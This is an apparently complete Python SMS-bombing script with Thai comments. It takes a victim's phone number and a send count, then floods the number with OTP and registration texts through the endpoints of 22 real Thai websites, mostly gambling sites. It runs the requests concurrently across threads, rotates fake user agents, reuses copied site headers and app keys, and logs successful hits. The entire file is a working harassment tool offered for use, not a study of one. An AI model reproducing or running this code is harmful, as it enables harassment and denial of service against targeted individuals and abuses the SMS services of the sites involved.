import phonenumbers
import requests
import random
import time
from fake_useragent import UserAgent
import json
import threading
import queue
from requests.exceptions import JSONDecodeError

ua = UserAgent()

# Lock สำหรับการเขียนไฟล์
file_lock = threading.Lock()
# สถานะการแจ้งเตือน API และ cooldown
api_status = {
    "api1": {"active": True, "cooldown": 0, "notified": False},  # Gogo-Shop
    "api2": {"active": True, "cooldown": 0, "notified": False},  # Kex-Express
    "api3": {"active": True, "cooldown": 0, "notified": False},  # Jaomuehuay
    "api4": {"active": True, "cooldown": 0, "notified": False},  # Jut8
    "api5": {"active": True, "cooldown": 0, "notified": False},  # Cdo888
    "api6": {"active": True, "cooldown": 0, "notified": False},  # Joneslot
    "api7": {"active": True, "cooldown": 0, "notified": False},  # Swin168
    "api8": {"active": True, "cooldown": 0, "notified": False},  # Johnwick168
    "api9": {"active": True, "cooldown": 0, "notified": False},  # Skyslot7
    "api10": {"active": True, "cooldown": 0, "notified": False}, # Mgi88
    "api11": {"active": True, "cooldown": 0, "notified": False}, # DeeCasino
    "api12": {"active": True, "cooldown": 0, "notified": False}, # Mgame666
    "api13": {"active": True, "cooldown": 0, "notified": False}, # Prompkai
    "api14": {"active": True, "cooldown": 0, "notified": False}, # Fun24
    "api15": {"active": True, "cooldown": 0, "notified": False}, # Wm78bet
    "api16": {"active": True, "cooldown": 0, "notified": False}, # Happy168
    "api17": {"active": True, "cooldown": 0, "notified": False}, # Pgheng
    "api18": {"active": True, "cooldown": 0, "notified": False}, # Aplusfun
    "api19": {"active": True, "cooldown": 0, "notified": False}, # Cueu77778887
    "api20": {"active": True, "cooldown": 0, "notified": False}, # Oneforbet
    "api21": {"active": True, "cooldown": 0, "notified": False}, # Joker123ths
    "api22": {"active": True, "cooldown": 0, "notified": False}  # Jklmn23456
}
api_lock = threading.Lock()

# ฟังก์ชันส่ง OTP สำหรับแต่ละ API (เหมือนเดิมจากโค้ดต้นฉบับ)
def api1(phone):
    """Gogo-Shop"""
    url = "https://gogo-shop.com/app/index/send_sms"
    headers = {"Host": "gogo-shop.com", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://gogo-shop.com", "Referer": "https://gogo-shop.com/app/index/register?username=39014291"}
    data = f"type=1&telephone={phone}&select=66"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and '"code":1' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Gogo-Shop: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api2(phone):
    """Kex-Express"""
    url = f"https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{phone}"
    headers = {"Host": "io.th.kex-express.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Appid": "Website_Api", "Appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://th.kex-express.com", "Referer": "https://th.kex-express.com/"}
    try:
        response = requests.post(url, headers=headers, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, json.loads(response.text).get("result", {}).get("reference", "N/A")
        return response, None
    except Exception as e:
        print(f"Kex-Express: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api3(phone):
    """Jaomuehuay"""
    url = "https://jaomuehuay.io/api/auth/send-otp"
    headers = {"Host": "jaomuehuay.io", "User-Agent": ua.random, "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://jaomuehuay.io", "Referer": "https://jaomuehuay.io/register/jaomuehuay"}
    payload = {"phone_number": phone, "affiliateCode": "jaomuehuay", "type": 1}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"Success":true' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Jaomuehuay: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api4(phone):
    """Jut8"""
    url = "https://www.jut8.com/api/user/request-register-tac"
    headers = {"Host": "www.jut8.com", "User-Agent": ua.random, "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.jut8.com", "Referer": "https://www.jut8.com/th-th?signup=1"}
    payload = {"uname": "", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": phone, "language": "th", "langCountry": "th-th"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"status":true' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Jut8: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api5(phone):
    """Cdo888"""
    url = "https://m.cdo888.bet/ajax/submitOTP"
    headers = {"Host": "m.cdo888.bet", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://m.cdo888.bet", "Referer": "https://m.cdo888.bet/user/register"}
    data = f"send_otp={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and '"status":"success"' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Cdo888: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api6(phone):
    """Joneslot"""
    url = "https://www.joneslot.me/pussy888/otp.php?m=request"
    headers = {"Host": "www.joneslot.me", "User-Agent": ua.random, "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.joneslot.me", "Referer": "https://www.joneslot.me/pussy888/register"}
    data = f"phone={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and '"status":"success"' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Joneslot: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api7(phone):
    """Swin168"""
    url = "https://play.swin168.me/api/register/sms"
    headers = {"Host": "play.swin168.me", "User-Agent": ua.random, "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/json", "Origin": "https://play.swin168.me", "Referer": "https://play.swin168.me/register/"}
    payload = {"phone": phone, "agent_id": 1, "country_code": "TH"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Swin168: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api8(phone):
    """Johnwick168"""
    url = "https://www.johnwick168.me/signup.php"
    headers = {"Host": "www.johnwick168.me", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.johnwick168.me", "Referer": "https://www.johnwick168.me/signup.php"}
    data = f"act=step-1&tel={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Johnwick168: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api9(phone):
    """Skyslot7"""
    url = "https://skyslot7.me/member/otp.php?m=request"
    headers = {"Host": "skyslot7.me", "User-Agent": ua.random, "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://skyslot7.me", "Referer": "https://skyslot7.me/member/register"}
    data = f"phone={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and '"status":"success"' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Skyslot7: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api10(phone):
    """Mgi88"""
    url = "https://mgi88.me/api/otp"
    headers = {"Host": "mgi88.me", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://mgi88.me", "Referer": "https://mgi88.me/"}
    payload = {"telefon_number": phone, "registrera_typ": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Mgi88: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api11(phone):
    """DeeCasino"""
    url = "https://play.dee.casino/api/register/sms"
    headers = {"Host": "play.dee.casino", "User-Agent": ua.random, "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/json", "Origin": "https://play.dee.casino", "Referer": "https://play.dee.casino/register"}
    payload = {"phone": phone, "agent_id": 1, "country_code": "TH"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"DeeCasino: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api12(phone):
    """Mgame666"""
    url = "https://gw.mgame666.com/AuthAPI/SendSms"
    headers = {"Host": "gw.mgame666.com", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/json", "Origin": "https://okmega.pgm77.com", "Referer": "https://okmega.pgm77.com/"}
    payload = {"Phone": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Mgame666: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api13(phone):
    """Prompkai"""
    url = "https://api.prompkai.com/auth/preRegister"
    headers = {"Host": "api.prompkai.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://www.prompkai.com", "Referer": "https://www.prompkai.com/"}
    payload = {"username": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"error":false' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Prompkai: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api14(phone):
    """Fun24"""
    url = "https://www.fun24.bet/_ajax_/v3/register/request-otp"
    headers = {"Host": "www.fun24.bet", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.fun24.bet", "Referer": "https://www.fun24.bet/สล็อตfun24-เว็บสล็อตที่แตกบ่อยแตกหนัก-แตกง่าย"}
    data = f"phoneNumber={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Fun24: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api15(phone):
    """Wm78bet"""
    url = "https://wm78bet.bet/_ajax_/v3/register/request-otp"
    headers = {"Host": "wm78bet.bet", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://wm78bet.bet", "Referer": "https://wm78bet.bet/เว็บเกมส์สล็อต"}
    data = f"phoneNumber={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Wm78bet: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api16(phone):
    """Happy168"""
    url = "https://m.happy168.xyz/api/otp"
    headers = {"Host": "m.happy168.xyz", "User-Agent": ua.random, "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://m.happy168.xyz", "Referer": "https://m.happy168.xyz/?hid=V0H3O1B4TH"}
    payload = {"phone_number": phone, "register_type": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Happy168: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api17(phone):
    """Pgheng"""
    url = "https://pgheng.amaheng.com/api/otp?lang=th"
    headers = {"Host": "pgheng.amaheng.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://pgheng.amaheng.com", "Referer": "https://pgheng.amaheng.com/register?hid=T0F1K1A5RC"}
    payload = {"phone_number": phone, "register_type": "", "type_otp": "register"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Pgheng: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api18(phone):
    """Aplusfun"""
    url = "https://www.aplusfun.bet/_ajax_/v3/register/request-otp"
    headers = {"Host": "www.aplusfun.bet", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.aplusfun.bet", "Referer": "https://www.aplusfun.bet/spinix-สล็อตออนไลน์เดิมพันสุดมันส์ไม่มีเบื่อ"}
    data = f"phoneNumber={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Aplusfun: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api19(phone):
    """Cueu77778887"""
    url = "https://api-players.cueu77778887.com/register-otp"
    headers = {"Host": "api-players.cueu77778887.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://lcbet44.electrikora.com", "Referer": "https://lcbet44.electrikora.com/", "X-Exp-Signature": "62b3e4c0138d8500127860d5", "Authorization": "Bearer null"}
    payload = {"brands_id": "62b3e4c0138d8500127860d5", "tel": phone, "token": "", "captcha_id": "", "lot_number": "", "pass_token": "", "gen_time": "", "captcha_output": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code in (200, 201) and '"message":"ดำเนินการสำเร็จ"' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Cueu77778887: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api20(phone):
    """Oneforbet"""
    url = "https://api.oneforbet.com/auth/player/phone-check"
    headers = {"Host": "api.oneforbet.com", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Origin": "https://ohana888.net", "Referer": "https://ohana888.net/", "X-Site-Id": "26336fef-e961-449c-926d-93db6afef9c4", "X-Agency-Id": "df87f52d-4221-49b6-b6cb-827f92244b72"}
    payload = {"phone_number": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"status":"success"' in response.text:
            return response, json.loads(response.text).get("data", {}).get("otp_token", "N/A")
        return response, None
    except Exception as e:
        print(f"Oneforbet: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api21(phone):
    """Joker123ths"""
    url = "https://m.joker123ths.shop/api/otp"
    headers = {"Host": "m.joker123ths.shop", "User-Agent": ua.random, "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://m.joker123ths.shop", "Referer": "https://m.joker123ths.shop/?hid=E0G3S1A4YH"}
    payload = {"phone_number": phone, "register_type": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, "N/A"
        return response, None
    except Exception as e:
        print(f"Joker123ths: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def api22(phone):
    """Jklmn23456"""
    url = "https://jklmn23456.com/api/v1/user/phone/verify"
    headers = {"Host": "jklmn23456.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://pigspin.org", "Referer": "https://pigspin.org/", "ip_address": "182.232.78.75"}
    payload = {"phone_number": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"status":"SUCCESS"' in response.text:
            return response, json.loads(response.text).get("data", {}).get("otp_ref_code", "N/A")
        return response, None
    except Exception as e:
        print(f"Jklmn23456: เกิดข้อผิดพลาด: {str(e)}")
        return None, None

def clean_phone_number(phone):
    """ทำความสะอาดและตรวจสอบเบอร์โทรศัพท์"""
    phone = phone.strip()
    if phone.startswith("+66"):
        phone = "0" + phone[3:]
    phone = "".join(filter(str.isdigit, phone))
    return phone

def process_phone_with_api(phone, api_name, legit_file_path):
    retry_delay = 5000  # 5000 วินาที
    current_time = time.time()

    # อัพเดทสถานะ API
    with api_lock:
        if not api_status[api_name]["active"] and current_time >= api_status[api_name]["cooldown"]:
            api_status[api_name]["active"] = True
            api_status[api_name]["notified"] = False
            print(f"{api_name} กลับมาใช้งานได้สำหรับเบอร์ {phone}")

    # ถ้า API ไม่ active ให้ข้าม
    with api_lock:
        if not api_status[api_name]["active"]:
            return False

    # เลือก API ตามชื่อ
    api_map = {
        "api1": (api1, "Gogo-Shop"),
        "api2": (api2, "Kex-Express"),
        "api3": (api3, "Jaomuehuay"),
        "api4": (api4, "Jut8"),
        "api5": (api5, "Cdo888"),
        "api6": (api6, "Joneslot"),
        "api7": (api7, "Swin168"),
        "api8": (api8, "Johnwick168"),
        "api9": (api9, "Skyslot7"),
        "api10": (api10, "Mgi88"),
        "api11": (api11, "DeeCasino"),
        "api12": (api12, "Mgame666"),
        "api13": (api13, "Prompkai"),
        "api14": (api14, "Fun24"),
        "api15": (api15, "Wm78bet"),
        "api16": (api16, "Happy168"),
        "api17": (api17, "Pgheng"),
        "api18": (api18, "Aplusfun"),
        "api19": (api19, "Cueu77778887"),
        "api20": (api20, "Oneforbet"),
        "api21": (api21, "Joker123ths"),
        "api22": (api22, "Jklmn23456")
    }
    
    api_func, api_label = api_map[api_name]
    start_time = time.time()
    response, ref = api_func(phone)
    end_time = time.time()
    response_time = end_time - start_time

    success_condition = response and response.status_code in (200, 201)
    if success_condition:
        print(f"{api_label} - เบอร์ {phone}: Status {response.status_code} | Response Time: {response_time:.2f} วินาที | Ref: {ref}")
        with file_lock:
            with open(legit_file_path, "a", encoding="utf-8") as legit_file:
                legit_file.write(f"{phone} | Status: {response.status_code} | API: {api_label} | Ref: {ref}\n")
        return True
    else:
        print(f"{api_label} - เบอร์ {phone}: ไม่สำเร็จ | Status: {response.status_code if response else 'N/A'}")
        with api_lock:
            if not api_status[api_name]["notified"]:
                print(f"{api_name} ใช้ไม่ได้ รอ {retry_delay} วินาที")
                api_status[api_name]["notified"] = True
            api_status[api_name]["active"] = False
            api_status[api_name]["cooldown"] = current_time + retry_delay
        return False

def worker(phone, api_name, legit_file_path, attempt_number):
    """ประมวลผลการส่ง SMS ด้วย API ที่ระบุ"""
    phone = phone.strip()
    if not phone:
        print(f"Attempt {attempt_number}: ไม่มีเบอร์โทรศัพท์ที่ระบุ")
        return

    try:
        parsed_number = phonenumbers.parse(phone, "TH")
        if not (phonenumbers.is_valid_number(parsed_number) and phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE):
            print(f"Attempt {attempt_number} - เบอร์ {phone}: ไม่ใช่เบอร์มือถือที่ถูกต้อง")
            return
    except phonenumbers.NumberParseException:
        print(f"Attempt {attempt_number} - เบอร์ {phone}: รูปแบบไม่ถูกต้อง")
        return

    success = process_phone_with_api(phone, api_name, legit_file_path)
    if not success:
        print(f"Attempt {attempt_number} - เบอร์ {phone}: API {api_name} ไม่สำเร็จ")

def send_sms_to_number(phone_number, num_attempts, legit_file_path="legit_phones.txt"):
    """ฟังก์ชันหลักสำหรับรับเบอร์โทรและจำนวนครั้งจากผู้ใช้ และส่ง SMS พร้อมกัน"""
    cleaned_phone = clean_phone_number(phone_number)
    if not cleaned_phone or len(cleaned_phone) != 10:
        print(f"เบอร์ {phone_number}: ไม่ถูกต้อง (ต้องมี 10 หลัก)")
        return

    if not isinstance(num_attempts, int) or num_attempts < 1:
        print("จำนวนครั้งต้องเป็นจำนวนเต็มบวก")
        return

    # รายการ API ทั้งหมด
    api_list = list(api_status.keys())
    num_apis = len(api_list)

    # หา API ที่ใช้งานได้
    active_apis = []
    with api_lock:
        for api in api_status:
            if api_status[api]["active"]:
                active_apis.append(api)

    if not active_apis:
        print(f"ไม่มี API ตัวไหนใช้งานได้ในขณะนี้")
        return

    # จำกัดจำนวน thread ตามจำนวน API ที่ใช้งานได้
    max_threads = min(num_attempts, len(active_apis))
    threads = []

    # สร้าง thread สำหรับแต่ละการส่ง
    for i in range(num_attempts):
        # เลือก API โดยวนลูปตามจำนวนครั้ง
        api_index = i % len(active_apis)  # วนใช้ API ที่ใช้งานได้
        api_name = active_apis[api_index]
        t = threading.Thread(target=worker, args=(cleaned_phone, api_name, legit_file_path, i + 1))
        threads.append(t)
        t.start()

        # เพิ่มดีเลย์เล็กน้อยเพื่อป้องกันการเรียก API พร้อมกันมากเกินไป
        time.sleep(random.uniform(0.1, 0.5))

    # รอให้ทุก thread เสร็จสิ้น
    for t in threads:
        t.join()

    print(f"การส่ง SMS {num_attempts} ครั้ง เสร็จสิ้น ✅")

# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    phone_number = input("กรุณาใส่เบอร์โทรศัพท์ (เช่น 0812345678 หรือ +66812345678): ")
    try:
        num_attempts = int(input("กรุณาใส่จำนวนครั้งที่ต้องการส่ง SMS: "))
        send_sms_to_number(phone_number, num_attempts)
    except ValueError:
        print("กรุณาใส่จำนวนครั้งเป็นตัวเลขจำนวนเต็ม")
